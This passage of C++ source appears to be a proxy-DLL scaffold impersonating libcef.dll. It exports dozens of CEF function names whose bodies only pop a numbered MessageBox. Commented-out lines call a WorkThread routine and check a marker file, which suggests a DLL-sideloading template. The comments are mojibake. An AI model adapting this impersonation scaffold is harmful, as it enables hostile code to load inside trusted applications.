////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////80
// ��������
extern "C" __declspec(dllexport) LPVOID cef_stream_writer_create_for_file()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"80","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////81
// ��������
extern "C" __declspec(dllexport) LPVOID cef_stream_writer_create_for_handler()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"81","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////82
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_ascii_to_utf16()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"82","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////83
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_ascii_to_wide()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"83","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////84
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_list_alloc()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"84","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////85
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_list_append()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"85","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////86
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_list_clear()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"86","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////87
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_list_copy()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"87","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////88
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_list_free()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"88","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////89
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_list_size()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"89","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////90
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_list_value()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"90","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////91
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_alloc()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"91","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////92
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_append()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"92","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////93
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_clear()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"93","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////94
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_find()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"94","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////95
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_free()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"95","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////96
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_key()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"96","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////97
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_size()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"97","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////98
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_map_value()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"98","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////99
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_alloc()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"99","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////100
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_append()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"100","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////101
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_clear()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"101","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////102
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_enumerate()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"102","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////103
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_find_count()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"103","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////104
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_free()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"104","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////105
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_key()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"105","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////106
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_size()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"106","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////107
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_multimap_value()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"107","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////108
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_userfree_utf16_alloc()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"108","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////109
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_userfree_utf16_free()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"109","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////110
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_userfree_utf8_alloc()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"110","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////111
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_userfree_utf8_free()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"111","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////112
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_userfree_wide_alloc()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"112","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////113
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_userfree_wide_free()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"113","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////114
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf16_clear()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"114","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////115
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf16_cmp()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"115","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////116
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf16_set()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"116","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////117
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf16_to_utf8()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"117","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////118
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf16_to_wide()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"118","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////119
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf8_clear()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"119","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////120
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf8_cmp()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"120","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////121
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf8_set()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"121","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////122
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf8_to_utf16()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"122","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////123
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_utf8_to_wide()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"123","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////124
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_wide_clear()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"124","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////125
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_wide_cmp()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"125","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////126
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_wide_set()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"126","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////127
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_wide_to_utf16()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"127","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////128
// ��������
extern "C" __declspec(dllexport) LPVOID cef_string_wide_to_utf8()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"128","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////129
// ��������
extern "C" __declspec(dllexport) LPVOID cef_task_runner_get_for_current_thread()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"129","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////130
// ��������
extern "C" __declspec(dllexport) LPVOID cef_task_runner_get_for_thread()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"130","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////131
// ��������
extern "C" __declspec(dllexport) LPVOID cef_time_delta()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"131","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////132
// ��������
extern "C" __declspec(dllexport) LPVOID cef_time_from_doublet()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"132","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////133
// ��������
extern "C" __declspec(dllexport) LPVOID cef_time_from_timet()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"133","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////134
// ��������
extern "C" __declspec(dllexport) LPVOID cef_time_now()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"134","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////135
// ��������
extern "C" __declspec(dllexport) LPVOID cef_time_to_doublet()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"135","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////136
// ��������
extern "C" __declspec(dllexport) LPVOID cef_time_to_timet()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"136","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////137
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_counter()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"137","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////138
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_counter_id()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"138","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////139
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_event_async_begin()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"139","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////140
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_event_async_end()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"140","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////141
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_event_async_step_into()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"141","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////142
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_event_async_step_past()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"142","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////143
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_event_begin()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"143","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////144
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_event_end()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"144","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////145
// ��������
extern "C" __declspec(dllexport) LPVOID cef_trace_event_instant()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"145","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////146
// ��������
extern "C" __declspec(dllexport) LPVOID cef_translator_test_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"146","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////147
// ��������
extern "C" __declspec(dllexport) LPVOID cef_translator_test_object_child_child_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"147","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////148
// ��������
extern "C" __declspec(dllexport) LPVOID cef_translator_test_object_child_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"148","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////149
// ��������
extern "C" __declspec(dllexport) LPVOID cef_translator_test_object_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"149","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////150
// ��������
extern "C" __declspec(dllexport) LPVOID cef_unregister_internal_web_plugin()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"150","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////151
// ��������
extern "C" __declspec(dllexport) LPVOID cef_uridecode()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"151","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////152
// ��������
extern "C" __declspec(dllexport) LPVOID cef_uriencode()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"152","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////153
// ��������
extern "C" __declspec(dllexport) LPVOID cef_urlrequest_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"153","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////154
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8context_get_current_context()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"154","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////155
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8context_get_entered_context()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"155","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////156
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8context_in_context()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"156","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////157
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8stack_trace_get_current()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"157","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////158
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_array()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"158","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////159
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_bool()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"159","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////160
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_date()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"160","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////161
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_double()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"161","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////162
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_function()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"162","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////163
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_int()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"163","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////164
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_null()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"164","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////165
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_object()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"165","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////166
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_string()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
